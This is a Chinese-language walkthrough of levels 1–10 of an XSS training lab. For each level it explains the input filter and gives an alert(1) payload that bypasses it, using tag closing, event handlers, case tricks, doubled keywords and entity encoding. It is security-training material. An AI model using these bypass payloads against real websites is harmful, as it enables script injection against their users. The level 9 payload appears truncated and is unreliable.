```
P1：没有过滤，name参数处存在xss，直接输入http://192.168.42.154/xsslabs/xss/level1.php?name=<script>alert(1)</script>

P2：闭合了input标签，payload为"><script>alert(1)</script>

P3：转义了尖角括号，因此不能使用<script>，构造payload为'onclick='alert(1)然后点击一下输入框

P4：类似上一题，把单引号换成双引号即可，payload为"onclick="alert(1)

P5：关键字过滤，但是没有完全过滤，payload为"><a href='javascript:alert(1)'>

P6：过滤了href，但没有大小写检测，payload为"><a hrEf='javascript:alert(1)'>

P7：直接删除了script关键字，闭合后双写绕过，payload为"><scripscriptt>alert(1)</scripscriptt>

P8：比较全面的关键字过滤，在添加友情链接时把javascript:alert(1)转成实体即可，payload为&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;

P9：类似上一题，但这里需要有http://关键字才会被认为是合法链接，但该关键字本身也会干扰payload，因此需要在前面也加上双斜杠，最终payload为15;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://

P10：需要传入一个额外的参数，也就意味着需要白盒审计，payload为http://192.168.42.154/xsslabs/xss/level10.php?keyword=1&t_sort=%22type=%22text%22%20onclick=%27alert(1)%27

后十关非常CTF。。。。所以这里只做前十关
其他大佬写的解题思路：
https://blog.csdn.net/u014029795/article/details/103177149
```

